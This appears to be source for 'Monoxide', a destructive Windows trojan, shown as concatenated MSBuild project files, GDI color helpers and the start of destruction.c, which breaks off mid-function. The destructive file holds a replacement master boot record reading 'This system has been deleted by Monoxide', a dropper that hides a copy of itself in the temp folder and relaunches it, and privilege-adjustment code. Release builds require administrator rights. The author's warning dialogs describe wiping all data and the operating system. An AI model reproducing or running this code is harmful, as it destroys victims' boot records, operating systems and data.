<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <ClCompile Include="main.c" />
    <ClCompile Include="callbacks.c" />
    <ClCompile Include="math.c" />
    <ClCompile Include="payloads.c" />
    <ClCompile Include="threads.c" />
    <ClCompile Include="color.c" />
    <ClCompile Include="destruction.c" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="callbacks.h" />
    <ClInclude Include="monoxide.h" />
    <ClInclude Include="math.h" />
    <ClInclude Include="payloads.h" />
    <ClInclude Include="def.h" />
    <ClInclude Include="threads.h" />
    <ClInclude Include="color.h" />
    <ClInclude Include="destruction.h" />
    <ClInclude Include="resource.h" />
  </ItemGroup>
  <ItemGroup>
    <ResourceCompile Include="Eruption.rc" />
  </ItemGroup>
</Project>
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="Current" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <DebuggerFlavor>WindowsLocalDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <DebuggerFlavor>WindowsLocalDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <DebuggerFlavor>WindowsLocalDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <DebuggerFlavor>WindowsLocalDebugger</DebuggerFlavor>
  </PropertyGroup>
</Project>
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>16.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{43caf408-3253-40b7-b0f6-8a115186ef72}</ProjectGuid>
    <RootNamespace>Monoxide</RootNamespace>
    <WindowsTargetPlatformVersion>7.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141_xp</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141_xp</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141_xp</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141_xp</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <LinkIncremental>false</LinkIncremental>
    <TargetName>$(ProjectName)x86</TargetName>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
    <TargetName>$(ProjectName)x64</TargetName>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level4</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <LanguageStandard_C>stdc17</LanguageStandard_C>
      <CallingConvention>StdCall</CallingConvention>
      <FloatingPointModel>Fast</FloatingPointModel>
      <EnableEnhancedInstructionSet>NotSet</EnableEnhancedInstructionSet>
      <TreatWarningAsError>true</TreatWarningAsError>
      <BasicRuntimeChecks>EnableFastChecks</BasicRuntimeChecks>
      <RuntimeLibrary>MultiThreadedDebugDLL</RuntimeLibrary>
      <BufferSecurityCheck>true</BufferSecurityCheck>
      <Optimization>Disabled</Optimization>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <IgnoreAllDefaultLibraries>false</IgnoreAllDefaultLibraries>
      <EntryPointSymbol>
      </EntryPointSymbol>
      <AdditionalDependencies>shlwapi.lib;winmm.lib;%(AdditionalDependencies)</AdditionalDependencies>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level4</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <LanguageStandard_C>stdc17</LanguageStandard_C>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
      <CallingConvention>StdCall</CallingConvention>
      <FloatingPointModel>Fast</FloatingPointModel>
      <EnableEnhancedInstructionSet>NotSet</EnableEnhancedInstructionSet>
      <EnableFiberSafeOptimizations>true</EnableFiberSafeOptimizations>
      <FavorSizeOrSpeed>Speed</FavorSizeOrSpeed>
      <TreatWarningAsError>true</TreatWarningAsError>
      <BasicRuntimeChecks>Default</BasicRuntimeChecks>
      <BufferSecurityCheck>true</BufferSecurityCheck>
      <Optimization>MaxSpeed</Optimization>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>false</GenerateDebugInformation>
      <IgnoreAllDefaultLibraries>false</IgnoreAllDefaultLibraries>
      <EntryPointSymbol>
      </EntryPointSymbol>
      <AdditionalDependencies>shlwapi.lib;winmm.lib;%(AdditionalDependencies)</AdditionalDependencies>
      <UACExecutionLevel>RequireAdministrator</UACExecutionLevel>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level4</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <LanguageStandard_C>stdc17</LanguageStandard_C>
      <CallingConvention>StdCall</CallingConvention>
      <FloatingPointModel>Fast</FloatingPointModel>
      <EnableEnhancedInstructionSet>NotSet</EnableEnhancedInstructionSet>
      <TreatWarningAsError>true</TreatWarningAsError>
      <BasicRuntimeChecks>EnableFastChecks</BasicRuntimeChecks>
      <RuntimeLibrary>MultiThreadedDebugDLL</RuntimeLibrary>
      <BufferSecurityCheck>true</BufferSecurityCheck>
      <Optimization>Disabled</Optimization>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <IgnoreAllDefaultLibraries>false</IgnoreAllDefaultLibraries>
      <EntryPointSymbol>
      </EntryPointSymbol>
      <AdditionalDependencies>shlwapi.lib;winmm.lib;%(AdditionalDependencies)</AdditionalDependencies>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level4</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <LanguageStandard_C>stdc17</LanguageStandard_C>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
      <CallingConvention>StdCall</CallingConvention>
      <FloatingPointModel>Fast</FloatingPointModel>
      <EnableEnhancedInstructionSet>NotSet</EnableEnhancedInstructionSet>
      <EnableFiberSafeOptimizations>true</EnableFiberSafeOptimizations>
      <FavorSizeOrSpeed>Speed</FavorSizeOrSpeed>
      <TreatWarningAsError>true</TreatWarningAsError>
      <BasicRuntimeChecks>Default</BasicRuntimeChecks>
      <BufferSecurityCheck>true</BufferSecurityCheck>
      <Optimization>MaxSpeed</Optimization>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>false</GenerateDebugInformation>
      <IgnoreAllDefaultLibraries>false</IgnoreAllDefaultLibraries>
      <EntryPointSymbol>
      </EntryPointSymbol>
      <AdditionalDependencies>shlwapi.lib;winmm.lib;%(AdditionalDependencies)</AdditionalDependencies>
      <UACExecutionLevel>RequireAdministrator</UACExecutionLevel>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="callbacks.c" />
    <ClCompile Include="color.c" />
    <ClCompile Include="destruction.c" />
    <ClCompile Include="extra_payloads.c" />
    <ClCompile Include="main.c" />
    <ClCompile Include="math.c" />
    <ClCompile Include="payloads.c" />
    <ClCompile Include="threads.c" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="callbacks.h" />
    <ClInclude Include="color.h" />
    <ClInclude Include="def.h" />
    <ClInclude Include="destruction.h" />
    <ClInclude Include="extra_payloads.h" />
    <ClInclude Include="monoxide.h" />
    <ClInclude Include="math.h" />
    <ClInclude Include="payloads.h" />
    <ClInclude Include="resource.h" />
    <ClInclude Include="test.h" />
    <ClInclude Include="threads.h" />
  </ItemGroup>
  <ItemGroup>
    <ResourceCompile Include="monoxide.rc" />
  </ItemGroup>
  <ItemGroup>
    <Image Include="..\monoxide.ico" />
  </ItemGroup>
  <ItemGroup>
    <None Include="..\.editorconfig" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="Current" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup />
</Project>
#include "monoxide.h"

BOOL
CALLBACK
MonitorEnumProc(
    _In_ HMONITOR hMonitor,
    _In_ HDC hDC,
    _In_ PRECT prcArea,
    _In_ LPARAM lParam
)
{
    UNREFERENCED_PARAMETER( hMonitor );
    UNREFERENCED_PARAMETER( hDC );
    UNREFERENCED_PARAMETER( lParam );

    rcScrBounds.left = min( rcScrBounds.left, prcArea->left );
    rcScrBounds.top = min( rcScrBounds.top, prcArea->top );
    rcScrBounds.right = max( rcScrBounds.right, prcArea->right );
    rcScrBounds.bottom = max( rcScrBounds.bottom, prcArea->bottom );

    return TRUE;
}
    
LRESULT
CALLBACK
NoDestroyWndProc(
    _In_ HWND hWnd,
    _In_ DWORD dwMsg,
    _In_ WPARAM wParam,
    _In_ LPARAM lParam
)
{
    switch ( dwMsg )
    {
    default:
        return DefWindowProcW( hWnd, dwMsg, wParam, lParam );
    case WM_DESTROY:
    case WM_CLOSE:
    case WM_QUIT:
        return CALLBACK_NULL;
    }
}

VOID
CALLBACK
TimerProc(
    _In_ HWND hWnd,
    _In_ UINT nMsg,
    _In_ UINT nIDEvent,
    _In_ DWORD dwTime
)
{
    UNREFERENCED_PARAMETER( hWnd );
    UNREFERENCED_PARAMETER( nMsg );
    UNREFERENCED_PARAMETER( nIDEvent );
    UNREFERENCED_PARAMETER( dwTime );

    nCounter++;
}
#pragma once
#include "monoxide.h"

BOOL
CALLBACK
MonitorEnumProc(
    _In_ HMONITOR hMonitor,
    _In_ HDC hDC,
    _In_ PRECT prcArea,
    _In_ LPARAM lParam
);

LRESULT
CALLBACK
NoDestroyWndProc(
    _In_ HWND hWnd,
    _In_ DWORD dwMsg,
    _In_ WPARAM wParam,
    _In_ LPARAM lParam
);

VOID
CALLBACK
TimerProc(
    _In_ HWND hWnd,
    _In_ UINT nMsg,
    _In_ UINT nIDEvent,
    _In_ DWORD dwTime
);
#include "monoxide.h"

HSLCOLOR
RGBToHSL(
	_In_ RGBQUAD rgb
)
{
	HSLCOLOR hsl;

	BYTE r = rgb.r;
	BYTE g = rgb.g;
	BYTE b = rgb.b;

	FLOAT _r = ( FLOAT )r / 255.f;
	FLOAT _g = ( FLOAT )g / 255.f;
	FLOAT _b = ( FLOAT )b / 255.f;

	FLOAT rgbMin = min( min( _r, _g ), _b );
	FLOAT rgbMax = max( max( _r, _g ), _b );

	FLOAT fDelta = rgbMax - rgbMin;
	FLOAT deltaR;
	FLOAT deltaG;
	FLOAT deltaB;

	FLOAT h = 0.f;
	FLOAT s = 0.f;
	FLOAT l = ( FLOAT )( ( rgbMax + rgbMin ) / 2.f );

	if ( fDelta != 0.f )
	{
		s = l < .5f ? ( FLOAT )( fDelta / ( rgbMax + rgbMin ) ) : ( FLOAT )( fDelta / ( 2.f - rgbMax - rgbMin ) );
		deltaR = ( FLOAT )( ( ( rgbMax - _r ) / 6.f + ( fDelta / 2.f ) ) / fDelta );
		deltaG = ( FLOAT )( ( ( rgbMax - _g ) / 6.f + ( fDelta / 2.f ) ) / fDelta );
		deltaB = ( FLOAT )( ( ( rgbMax - _b ) / 6.f + ( fDelta / 2.f ) ) / fDelta );

		if ( _r == rgbMax )
		{
			h = deltaB - deltaG;
		}
		else if ( _g == rgbMax )
		{
			h = ( 1.f / 3.f ) + deltaR - deltaB;
		}
		else if ( _b == rgbMax )
		{
			h = ( 2.f / 3.f ) + deltaG - deltaR;
		}

		if ( h < 0.f )
		{
			h += 1.f;
		}
		if ( h > 1.f )
		{
			h -= 1.f;
		}
	}

	hsl.h = h;
	hsl.s = s;
	hsl.l = l;
	return hsl;
}

RGBQUAD
HSLToRGB(
	_In_ HSLCOLOR hsl
)
{
	RGBQUAD rgb;

	FLOAT r = hsl.l;
	FLOAT g = hsl.l;
	FLOAT b = hsl.l;

	FLOAT h = hsl.h;
	FLOAT sl = hsl.s;
	FLOAT l = hsl.l;
	FLOAT v = ( l <= .5f ) ? ( l * ( 1.f + sl ) ) : ( l + sl - l * sl );

	FLOAT m;
	FLOAT sv;
	FLOAT fract;
	FLOAT vsf;
	FLOAT mid1;
	FLOAT mid2;

	INT sextant;

	if ( v > 0.f )
	{
		m = l + l - v;
		sv = ( v - m ) / v;
		h *= 6.f;
		sextant = ( INT )h;
		fract = h - sextant;
		vsf = v * sv * fract;
		mid1 = m + vsf;
		mid2 = v - vsf;

		switch ( sextant )
		{
		case 0:
			r = v;
			g = mid1;
			b = m;
			break;
		case 1:
			r = mid2;
			g = v;
			b = m;
			break;
		case 2:
			r = m;
			g = v;
			b = mid1;
			break;
		case 3:
			r = m;
			g = mid2;
			b = v;
			break;
		case 4:
			r = mid1;
			g = m;
			b = v;
			break;
		case 5:
			r = v;
			g = m;
			b = mid2;
			break;
		}
	}

	rgb.r = ( BYTE )( r * 255.f );
	rgb.g = ( BYTE )( g * 255.f );
	rgb.b = ( BYTE )( b * 255.f );

	return rgb;
}
#pragma once
#include "monoxide.h"

typedef struct {
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSLCOLOR;

HSLCOLOR
RGBToHSL(
	_In_ RGBQUAD rgb
);

RGBQUAD
HSLToRGB(
	_In_ HSLCOLOR hsl
);
#pragma once
#include "monoxide.h"

typedef union
{
	COLORREF rgb;
	struct
	{
		BYTE b;
		BYTE g;
		BYTE r;
		BYTE unused;
	};
} RGBQUAD, *PRGBQUAD;

typedef VOID( WINAPI GDI_SHADER )(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ HDC hdcTemp,
	_In_ HBITMAP hbmTemp,
	_In_ PRGBQUAD prgbSrc,
	_Inout_ PRGBQUAD prgbDst
	), *PGDI_SHADER;

typedef VOID( WINAPI GDI_SHADER_OPERATION )(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ RECT rcBounds,
	_In_ HDC hdcDst,
	_In_ HDC hdcTemp
	), *PGDI_SHADER_OPERATION;

typedef struct tagGDI_SHADER_PARAMS
{
	PGDI_SHADER pGdiShader;
	PGDI_SHADER_OPERATION pPreGdiShader;
	PGDI_SHADER_OPERATION pPostGdiShader;
} GDI_SHADER_PARAMS, *PGDISHADER_PARAMS;

typedef VOID( WINAPI AUDIO_SEQUENCE )(
	_In_ INT nSamplesPerSec,
	_In_ INT nSampleCount,
	_Inout_ PSHORT psSamples
	), *PAUDIO_SEQUENCE;

typedef VOID( WINAPI AUDIOSEQUENCE_OPERATION )(
	_In_ INT nSamplesPerSec
	), *PAUDIO_SEQUENCE_OPERATION;

typedef struct tagAUDIO_SEQUENCE_PARAMS
{
	INT nSamplesPerSec;
	INT nSampleCount;
	PAUDIO_SEQUENCE pAudioSequence;
	PAUDIO_SEQUENCE_OPERATION pPreAudioOp;
	PAUDIO_SEQUENCE_OPERATION pPostAudioOp;
} AUDIO_SEQUENCE_PARAMS, *PAUDIO_SEQUENCE_PARAMS;
#include "monoxide.h"

const CHAR pccMbrData[ 512 ] = {
	0x31, 0xC0, 0x8E, 0xD8, 0x8E, 0xC0, 0x8E, 0xE0, 0x8E, 0xE8, 0x8E, 0xD0, 0x66, 0xBC, 0x00, 0x7C,
	0x00, 0x00, 0x66, 0x89, 0xE5, 0xEA, 0x1A, 0x7C, 0x00, 0x00, 0x30, 0xE4, 0xB0, 0x13, 0xCD, 0x10,
	0x0F, 0x31, 0xA3, 0xA9, 0x7C, 0xE8, 0x24, 0x00, 0xB8, 0x00, 0xA0, 0x8E, 0xC0, 0xBF, 0xFF, 0xF9,
	0xB1, 0x20, 0xEB, 0x44, 0x89, 0xD8, 0xC1, 0xE0, 0x07, 0x31, 0xC3, 0x89, 0xD8, 0xC1, 0xE8, 0x09,
	0x31, 0xC3, 0x89, 0xD8, 0xC1, 0xE0, 0x08, 0x31, 0xC3, 0x89, 0xD8, 0xC3, 0xB4, 0x02, 0x30, 0xFF,
	0x30, 0xD2, 0xCD, 0x10, 0xBE, 0xAB, 0x7C, 0xAC, 0x08, 0xC0, 0x74, 0x15, 0x50, 0x8B, 0x1E, 0xA9,
	0x7C, 0xE8, 0xD0, 0xFF, 0x31, 0x06, 0xA9, 0x7C, 0x88, 0xC3, 0x58, 0xB4, 0x0E, 0xCD, 0x10, 0xEB,
	0xE6, 0xFE, 0xC6, 0x74, 0x02, 0xEB, 0xD5, 0xC3, 0x8B, 0x1E, 0xA9, 0x7C, 0xE8, 0xB5, 0xFF, 0x31,
	0x06, 0xA9, 0x7C, 0x31, 0xD2, 0xBB, 0x03, 0x00, 0xF7, 0xF3, 0x89, 0xD0, 0x00, 0xC8, 0x26, 0x88,
	0x05, 0x4F, 0x83, 0xFF, 0xFF, 0x75, 0xE1, 0xBF, 0xFF, 0xF9, 0x80, 0xF9, 0x33, 0x7F, 0x04, 0xFE,
	0xC1, 0xEB, 0xD5, 0xFE, 0xC5, 0xB1, 0x20, 0xEB, 0xCF, 0x00, 0x10, 0x54, 0x68, 0x69, 0x73, 0x20,
	0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x20, 0x68, 0x61, 0x73, 0x20, 0x62, 0x65, 0x65, 0x6E, 0x20,
	0x64, 0x65, 0x6C, 0x65, 0x74, 0x65, 0x64, 0x20, 0x62, 0x79, 0x20, 0x4D, 0x6F, 0x6E, 0x6F, 0x78,
	0x69, 0x64, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};

BOOL
WINAPI
ExecuteDropper( VOID )
{
	WCHAR szPath[ MAX_PATH ] = { 0 };
	WCHAR szNewPath[ MAX_PATH ] = { 0 };
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi;
	DWORD dwUnnamed;
	HANDLE hFile;

	GetModuleFileNameW( NULL, szPath, MAX_PATH );
start:
	GetTempPathW( MAX_PATH, szNewPath );

	if ( wcsncmp( szPath, szNewPath, wcslen( szNewPath ) ) )
	{
		WCHAR szFileName[ 17 ] = { 0 };
		GetRandomPath( szFileName, 16 );
		wcscat_s( szNewPath, MAX_PATH, szFileName );
		wcscat_s( szNewPath, MAX_PATH, L".txt" );

		if ( ( hFile = CreateFileW( szNewPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL ) ) == INVALID_HANDLE_VALUE )
		{
			RtlZeroMemory( szNewPath, MAX_PATH );
			goto start;
		}

		while ( !WriteFile( hFile, szPath, MAX_PATH, &dwUnnamed, NULL ) )
		{
			Sleep( 10 );
		}

		CloseHandle( hFile );

		GetTempPathW( MAX_PATH, szNewPath );
		wcscat_s( szNewPath, MAX_PATH, szFileName );
		wcscat_s( szNewPath, MAX_PATH, L".exe" );

		while ( !CopyFileW( szPath, szNewPath, FALSE ) )
		{
			Sleep( 10 );
		}

		while ( !SetFileAttributesW( szNewPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM ) )
		{
			Sleep( 10 );
		}

		si.cb = sizeof( si );
		CreateProcessW( szNewPath, NULL, NULL, NULL, FALSE, DETACHED_PROCESS, NULL, NULL, &si, &pi );
		CloseHandle( pi.hProcess );
		CloseHandle( pi.hThread );

		return FALSE;
	}
	else
	{
		*wcsrchr( szPath, L'.' ) = 0;
		wcscat_s( szPath, MAX_PATH, L".txt" );

		while ( ( hFile = CreateFileW( szPath, GENERIC_READ, 0, NULL, OPEN_ALWAYS, 0, NULL ) ) == INVALID_HANDLE_VALUE )
		{
			Sleep( 10 );
		}

		while ( !ReadFile( hFile, szNewPath, MAX_PATH, &dwUnnamed, NULL ) )
		{
			Sleep( 10 );
		}

		CloseHandle( hFile );

		while ( !DeleteFileW( szPath ) )
		{
			Sleep( 10 );
		}
		
		while ( !DeleteFileW( szNewPath ) )
		{
			Sleep( 10 );
		}

		if ( MessageBoxW( NULL, L"WARNING!\n\nYou have ran a Trojan known as Monoxide.exe that has full capacity to delete all of your data and your operating system.\n\nBy continuing, you keep in mind that the creator will not be responsible for any damage caused by this trojan and it is highly recommended that you run this in a testing virtual machine where a snapshot has been made before execution for the sake of entertainment and analysis.\n\nAre you sure you want to run this?", L"Malware alert - Monoxide.exe", MB_ICONWARNING | MB_YESNO ) != IDYES )
			return FALSE;
		if ( MessageBoxW( NULL, L"FINAL WARNING!!!\n\nThis Trojan has a lot of destructive potential. You will lose all of your data if you continue, and the creator will not be responsible for any of the damage caused. This is not meant to be malicious but simply for entertainment and educational purposes.\n\nAre you sure you want to continue? This is your final chance to stop this program from execution.", L"Malware alert - Monoxide.exe", MB_ICONWARNING | MB_YESNO ) != IDYES )
			return FALSE;
	}

	return TRUE;
}

BOOL
WINAPI
SetPrivilege(
	_In_ HANDLE hToken,
	_In_ PCWSTR szPrivilege,
	_In_ BOOL bEnablePrivilege
)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if ( !LookupPrivilegeValueW( NULL, szPrivilege, &luid ) )
	{
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[ 0 ].Luid = luid;
	if ( bEnablePrivilege )
		tp.Privileges[ 0 ].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[ 0 ].Attributes = 0;

	if ( !AdjustTokenPrivileges( hToken, FALSE, &tp, sizeof( TOKEN_PRIVILEGES ), ( PTOKEN_PRIVILEGES )NULL, ( PDWORD )NULL ) )
	{
		return FALSE;
	}

	if ( GetLastError( ) == ERROR_NOT_ALL_ASSIGNED )
	{
		return FALSE;
	}

	return TRUE;
}

BOOL
WINAPI
TakeOwnership(
	_In_ PWSTR szFile
)
{
	BOOL bRetval = FALSE;
